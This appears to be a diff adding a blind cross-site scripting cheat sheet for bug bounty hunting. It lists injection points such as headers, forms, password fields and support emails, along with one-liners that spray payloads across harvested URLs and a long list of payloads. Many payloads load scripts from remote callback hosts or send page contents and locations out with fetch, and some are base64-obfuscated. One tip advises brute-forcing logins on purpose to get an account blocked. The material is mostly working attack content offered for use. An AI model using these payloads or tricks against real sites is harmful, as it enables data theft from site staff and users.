@@ -1,0 +1,194 @@
+Awesome Blind XSS Hunting Tip:
+------------------------------
+Find blind XSS whilst hunting by changing your `User-Agent` to an XSS payload using a `match/replace` rule in Burpsuite.If yo lucky, you get a pingback someday!
+
+This script can crawl the website and find URLs that contain HTML Forms. Very useful for me to find Forms for Blind XSS.
+https://github.com/dirtycoder0124/formcrawler
+
+Tool: https://github.com/AnonKryptiQuz/BeeXSS
+Payloads: https://github.com/jadu101/blind_xss_payload_generator/tree/main
+
+Tip : use Triple Encoded payload while browsing website.
+Spray base64 encoded payload  in accept Header
+Tips : Submit a form multiple times, using different headers.
+Tip : Use Polyglot Payloads also
+Tip : Also Send payload to Referrer Header when submitting a form.
+Tip: use svg tag payload
+Payload use : base tag (microsoft)
+Tip: use bing dorking to find endpoints
+Spray your blindxss payload everywhere:) 
+Spray base64 encoded payload  in accept Header
+Always try to send a lot of payload through the user agent
+
+
+Find blind XSS endpoints
+1. Visit your email client like Gmail etc.
+2. Search for Unsubscribe/feedback/Manage preferences.
+3. Click on Unsubscribe and put BXSS payload if they ask for any feedback.
+
+
+WHERE TO HUNT FOR BLIND XSS BY COFFIN :)
+Error Messages
+Comment Sections
+Search functionality
+Email notifications
+Surveys/Review forms
+Contact/Feedback pages
+Chat applications/Forums
+Login Pages/Registration pages
+Customer ticket applications
+put xss in X-Forwarded-For header
+Your Password As Blind XSS Payload
+Add Blind XSS in password reset fields
+Blind XSS Payload in User-Agent User/Host Headers
+put blind xss payloads in your name and description fields For Automation:
+use tools such as kxss/bxss/Gxss/knoxss/xsstrike/dalfox/
+Inside Burp Suite's match & replace function, in the match section put your User-Agent's value and payload as ""><script src=yourdomain></script> in the replace section
+Input fields during signup / registration
+Login Page
+Contact form
+Feedback form
+"File a complaint" box form
+"Report xyz" form
+Password reset
+Profile update page
+Comment section
+Forums
+Chatbot section
+Support ticket
+"Ask for help" form
+Subscription , Newsletter, Survey form
+One to one chat messaging
+User-Agent header in request
+Referer header in request
+Origin header in request
+Upload HTML file with BXSS payload
+
+Dirty Tricks:
+-------------
+User-Agent during actions ex. Reg,Login,Contact
+X-Forwarded-For during actions
+Direct Mail to Support
+Any form
+Perform malicious actions to generate log
+Always put BHTML payload in below bxss payloads
+Use promotional mails to find new endpoint like unsubscribe etc...
+Follow ur target on Twitter to get latest update / feedback form/new endpoint
+Put bxss payload during registration
+- Get blocked by doing bruteforce on login form
+- Request them to unblock the account
+Get in touch to our team form
+
+Target: "reach to xyz@target3dotcom"
+1. opened gmail and added img BXSS payload in subject
+2. email sent to xyz email.
+
+Admin panel vulnerable to Store Blind Xss:
+------------------------------------------
+username=admin@gmail.com
+password="><svg/onload=prompt(1)>
+
+Match & Replace Blind XSS:
+--------------------------
+Request header
+Match  : ^Referer.*$
+Replace: Referer: '"><script src=https://newone.xss.ht></script>
+
+Automated blind-xss search for Burp Suite
+https://github.com/emadshanab/femida
+
+Blind XSS at Scale:
+-------------------
+cat roots.txt | waybackurls | httpx-toolkit -H "User-Agent: \"><script src......</script>"
+
+Blind XSS payload on list of Urls with params:
+----------------------------------------------
+cat urls.txt | qsreplace '"><script src=https://newone.xss.ht></script> | rush -j40 'curl -sk "{}" -o /dev/null"
+
+Blind XSS In X-Forwarded-For Header:
+subfinder -d http://target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
+
+Automate Task:
+--------------
+subfinder -d target.com | gau | bxss -payload '"><script src=https://.....></script>' -header "X-Forwarded-For"
+cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\n";done\
+
+
+Report: site:hackerone.com inurl:reports "blind XSS"
+----------------------------------------------------------------------------------------------------------------------------------
+
+<!-- Image tag -->
+'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+<!-- Input tag with autofocus -->
+'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+<!-- In case jQuery is loaded, we can make use of the getScript method -->
+'"><script>$.getScript("{SERVER}/script.js")</script>
+<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
+javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))
+<!-- Render an iframe to validate your injection point and receive a callback -->
+'"><iframe src="{SERVER}"></iframe>
+<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
+<base href="{SERVER}" />
+<!-- Make use of the meta-tag to initiate a redirect -->
+<meta http-equiv="refresh" content="0; url={SERVER}" />
+<!-- In case your target makes use of AngularJS -->
+{{constructor.constructor("import('{SERVER}/script.js')")()}}
+1'"<S/--><Script Src=//X55.is?1=[id]></Script>
+
+'"><script src="{SERVER}/script.js"></script>
+'"><svg onload="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">
+const x=document.createElement('script');x.src='{SERVER}/script.js';document.body.appendChild(x);
+'"><img src="{SERVER}/img.png">
+<iframe src=“javascript:alert(document.domain)” />
+'"></title></textarea></script></style></noscript><script src=https://xss0r.com/c/lostsec></script>
+</scrIpt><script src="https://xoxoxo"></scrIpt>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss/"></scrIpt>
+'//><scrIpt src=//xss.report/c/kee-kee></scrIpt>
+"><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;http://test.bxss.in&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
+%22%3E%3Cinput%20onfocus%3Deval%28atob%http://28this.id%29%29%20id%3DdmFyIGE9ZG9jdW1lbnQpOw%20autofocus%3E
+{{constructor.constructor('eval(atob(\'dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3Rlc3QtdGVzdCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTsmIzYxOyYjNjE=\'))')()}}
+';"</scrpt><scrpt/src=//xss.report/c/lostsec></scrpt>
+'"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
+"><Script /Src=https://X55.is/?1=KK></Script>
+<Iframe SrcDoc="<Script Src=http://xss.ht></Script>">
+
+New Payload:
+------------
+'"><Svg Src=//{CANARY_TOKEN}/s OnLoad=import(this.getAttribute('src')+0)>
+'"><Img Src=//{CANARY_TOKEN}/x Onload=import(src+0)>
+
+Automation:
+-----------
+- Use https://github.com/Leoid/MatchandReplace
+- Import to burpsuite match and replace.
+- Run gospider. gospider -s url -a -w --sitemap -r -c 100 -d 8 -p http://127.0.0.1:8080
+- The Blind xss payload will added automatically by burp and gospider.
+
+📲 Blind XSS Payloads 
+
+'"><img src="https://example.burpcollaborator.net/image">
+'"><img src="https://example.burpcollaborator.net/image-only" onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='this.src="https://"+btoa(document.location)+".example.burpcollaborator.net/image-dns?"'>
+'"><img src=x onerror='this.src="https://example.burpcollaborator.net/image-xss?"+btoa(document.location)'>
+'"><img src=x onerror='fetch("https://example.burpcollaborator.net/image-xss-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})'>
+'"><iframe src='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></iframe>
+'"><iframe srcdoc='<script>window.location="https://example.burpcollaborator.net/iframe-srcdoc?"+btoa(parent.document.location)</script>'></iframe>
+'"><iframe srcdoc='<script>fetch("https://example.burpcollaborator.net/iframe-srcdoc-post",{method:"POST",body:btoa(parent.document.body.innerHTML),mode:"no-cors"})</script>'></iframe>
+'"><object data='javascript:window.location="https://example.burpcollaborator.net/iframe-src?"+btoa(parent.document.location)'></object>
+<input onfocus='fetch("https://example.burpcollaborator.net/imput-post",{method:"POST",body:btoa(document.body.innerHTML),mode:"no-cors"})' autofocus>
+'"><script src=https://example.burpcollaborator.net/script-tag></script>
+'"><script type="text/javascript" src="https://example.burpcollaborator.net/script-tag-type"></script>
+'"><script type="module" src="https://example.burpcollaborator.net/script-tag-module"></script>
+'"><script nomodule src="https://example.burpcollaborator.net/script-tag-nomodule"></script>
+javascript:window.location="https://example.burpcollaborator.net/js-scheme?"+btoa(document.location)
+
+
+
+
+
+
+
+
+
+
